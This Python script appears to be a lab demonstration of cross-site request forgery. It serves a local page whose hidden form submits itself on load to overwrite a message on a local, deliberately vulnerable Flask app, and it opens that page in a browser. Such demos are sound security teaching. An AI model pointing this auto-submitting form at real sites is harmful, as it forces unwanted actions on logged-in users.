"""
This script demonstrates a CSRF (Cross-Site Request Forgery) attack simulation. 
It sets up a local HTTP server to serve a malicious HTML page that automatically submits a form to edit a message on a vulnerable Flask web application.

Key Features:
1. Hosts a malicious HTML page with an auto-submitting form targeting the vulnerable endpoint.
2. Simulates a CSRF attack by modifying the content of a message without user consent.
3. Opens the malicious page in the browser for demonstration purposes.

Usage:
1. Ensure the target Flask application is running locally.
2. Run this script to start the local HTTP server and open the malicious page.
3. Observe the effects of the CSRF attack on the target application.

"""

import http.server
import socketserver
import webbrowser
import threading
import time

# Target URL for the CSRF attack (modify the message ID or parameters as needed)
TARGET_URL = "http://127.0.0.1:5000/edit_message/10"
# Port for the local HTTP server
PORT = 8000

# Define the malicious CSRF HTML page content with an auto-submitting form
HTML_CONTENT = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CSRF Attack Simulation - Edit Message</title>
</head>
<body>
    <!-- Construct an auto-submitting form targeting the edit message endpoint -->
    <form id="csrfForm" action="{TARGET_URL}" method="POST">
        <!-- Submit the new message content via a hidden field -->
        <input type="hidden" name="content" value="This message has been tampered with!">
    </form>
    <script>
        // Automatically submit the form when the page loads
        document.getElementById('csrfForm').submit();
    </script>
    <p>If the form does not submit automatically, click the button below:</p>
    <button onclick="document.getElementById('csrfForm').submit();">Submit</button>
</body>
</html>
"""

class CSRFRequestHandler(http.server.SimpleHTTPRequestHandler):
    """
    Custom HTTP request handler to serve the malicious CSRF page.
    Responds to requests for '/csrf_attack.html' with the malicious HTML content.
    """
    def do_GET(self):
        if self.path == '/csrf_attack.html':
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(HTML_CONTENT.encode("utf-8"))
        else:
            self.send_error(404, "File not found")

def run_server():
    """
    Start a local HTTP server to serve the malicious CSRF page.
    """
    with socketserver.TCPServer(("", PORT), CSRFRequestHandler) as httpd:
        print(f"Malicious page is being served at: http://localhost:{PORT}/csrf_attack.html")
        httpd.serve_forever()

# Start the HTTP server in a background thread
server_thread = threading.Thread(target=run_server, daemon=True)
server_thread.start()

# Attempt to open the malicious page in Chrome or the default browser
try:
    browser = webbrowser.get("chrome")
except webbrowser.Error:
    print("Chrome browser not found, using the default browser.")
    browser = webbrowser.get()

browser.open(f"http://localhost:{PORT}/csrf_attack.html")

print("Waiting 30 seconds to observe the attack effect...")
time.sleep(30)
print("Script execution completed.")


